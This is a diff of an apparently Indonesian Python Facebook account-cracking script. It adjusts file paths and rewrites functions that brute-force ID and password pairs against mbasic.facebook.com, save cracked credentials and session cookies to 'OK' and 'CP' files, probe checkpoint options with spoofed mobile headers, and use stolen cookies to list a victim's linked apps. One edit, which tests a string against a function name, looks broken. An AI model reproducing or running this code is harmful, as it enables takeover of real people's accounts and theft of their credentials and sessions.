 				elif 'ya' in gabriel:
@@ -1982,7 +1989,7 @@ def colmek1(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1995,7 +2002,7 @@ def colmek1(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -2005,7 +2012,7 @@ def colmek1(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break		
 				
@@ -2043,7 +2050,7 @@ def colmek2(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -2057,7 +2064,7 @@ def colmek2(idf,pwv):
 					ceker(idf,pw)
 					break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				if 'no' in taplikasi:
+				if 'no' in cek_apk:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
@@ -2065,9 +2072,9 @@ def colmek2(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
-				elif 'ya' in taplikasi:
+				elif 'ya' in cek_apk:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
@@ -2075,7 +2082,7 @@ def colmek2(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break		
 				
@@ -2085,31 +2092,10 @@ def colmek2(idf,pwv):
 			time.sleep(31)
 	loop+=1
 
-#-----------------------[ CEK APLIKASI ]--------------------#
-def cek_apk(kuki):
-	session = requests.Session()
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
-	sop = bs4.BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	try:
-		for i in range(len(game)):
-			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
-	except AttributeError:
-		print ("\r    %s\033[0m cookie invalid"%(M))
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
-	sop = bs4.BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	try:
-		for i in range(len(game)):
-			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
-	except AttributeError:
-		print ("\r    %s \033[0mcookie invalid"%(M))
-
+# Cek Opsi Cp Otomatis #
 def ceker(idf,pw):
 	global cp
-	ua = 'Mozilla/5.0 (Linux; Android 12; CPH2089 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]'
+	ua="Mozilla/5.0 (Linux; Android 7.1.1; CPH1725 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36"
 	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 	ses = requests.Session()
 	try:
@@ -2122,17 +2108,41 @@ def ceker(idf,pw):
 			if anj.get('name') in lion:
 				data.update({anj.get('name'):anj.get('value')})
 		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
-		print('\r%s    [+] Opsi CheckPoint :   %s'%(b,idf,pw,x))
+		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
 		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+		cp+=1
 		opsi = kent.find_all('option')
 		if len(opsi)==0:
-			print('\r%s    [+] Tap Yes / A2F [ Cek Login Di Lite/Mbasic%s ]'%(hh,x))
+			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
 		else:
 			for opsii in opsi:
-				print('\r%s   [+] %s%s'%(kk,opsii.text,x))
+				print('\r%s---> %s%s'%(kk,opsii.text,x))
 	except Exception as c:
-		print('\r%s    [+] Tidak Dapat Mengecek Opsi [ Cek Login Di Lite/Mbasic ]%s'%(u,x))
+		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
+		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
 		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+		cp+=1
+#-----------------------[ CEK-APLIKASI ]--------------------#
+def cek_apk(kuki):
+	session = requests.Session()
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
+	sop = bs4.BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	try:
+		for i in range(len(game)):
+			print ("\r%s  \033[0m              🎮 %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
+	except AttributeError:
+		print ("\r    %s\033[0m cookie invalid"%(M))
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
+	sop = bs4.BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	try:
+		for i in range(len(game)):
+			print ("\r%s  \033[0m              🎮 %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
+	except AttributeError:
+		print ("\r    %s \033[0mcookie invalid"%(M))
 	
 #-----------------------[ DEF CEK OPSI ]--------------------#
 import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
@@ -2997,7 +3007,7 @@ if __name__=='__main__':
 	except:pass
 	try:os.mkdir('CP')
 	except:pass
-	try:os.mkdir('/sdcard/DUMP-FILE')
+	try:os.mkdir('sdcard/DUMP-FILE')
 	except:pass
 	try:os.system('touch .prox.txt')
 	except:pass
